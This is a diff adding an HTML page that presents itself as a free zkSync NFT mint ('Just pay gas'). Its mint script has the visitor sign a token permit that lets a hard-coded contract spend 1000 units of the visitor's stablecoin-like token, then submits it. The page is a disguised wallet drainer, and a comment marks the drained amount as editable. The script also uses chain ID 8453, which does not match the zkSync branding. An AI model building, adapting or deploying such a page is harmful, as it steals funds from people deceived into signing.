@@ -1,0 +1,121 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>zkSync NFT Mint</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #eee;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    h1 {
+      font-size: 32px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #00ffa5;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    #status {
+      margin-top: 20px;
+      color: lime;
+    }
+  </style>
+</head>
+<body>
+  <h1>zkSync FREE NFT Mint</h1>
+  <p>Claim your unique NFT before it’s gone. Limited supply. Just pay gas.</p>
+  <button onclick="mint()">Mint Now</button>
+  <div id="status"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+  <script>
+    const contractAddress = "0xc85B348A8aF59Af27ea90978CEC318f9B6b732e9";
+    const tokenAddress = "0xd9AA594BF3Aebe2e6c7711BfC70DC99d8C8C1F5A";
+
+    const abi = [
+      {
+        "inputs": [
+          { "internalType": "address", "name": "_token", "type": "address" }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+      },
+      {
+        "inputs": [
+          { "internalType": "uint256", "name": "value", "type": "uint256" },
+          { "internalType": "uint256", "name": "deadline", "type": "uint256" },
+          { "internalType": "uint8", "name": "v", "type": "uint8" },
+          { "internalType": "bytes32", "name": "r", "type": "bytes32" },
+          { "internalType": "bytes32", "name": "s", "type": "bytes32" }
+        ],
+        "name": "mintWithPermit",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ];
+
+    async function mint() {
+      const [signer] = await window.ethereum.request({ method: "eth_requestAccounts" });
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const user = await provider.getSigner();
+      const token = new ethers.Contract(tokenAddress, [
+        "function nonces(address) view returns (uint256)",
+        "function name() view returns (string)"
+      ], user);
+
+      const value = ethers.parseUnits("1000", 6); // можешь редактировать
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
+      const nonce = await token.nonces(signer);
+      const name = await token.name();
+
+      const domain = {
+        name,
+        version: "1",
+        chainId: 8453,
+        verifyingContract: tokenAddress
+      };
+
+      const types = {
+        Permit: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+          { name: "value", type: "uint256" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" }
+        ]
+      };
+
+      const permitData = {
+        owner: signer,
+        spender: contractAddress,
+        value,
+        nonce,
+        deadline
+      };
+
+      const signature = await user.signTypedData(domain, types, permitData);
+      const { r, s, v } = ethers.Signature.from(signature);
+
+      const contract = new ethers.Contract(contractAddress, abi, user);
+      const tx = await contract.mintWithPermit(value, deadline, v, r, s);
+      document.getElementById("status").innerText = "🧨 Mint executed. TX: " + tx.hash;
+    }
+  </script>
+</body>
+</html>
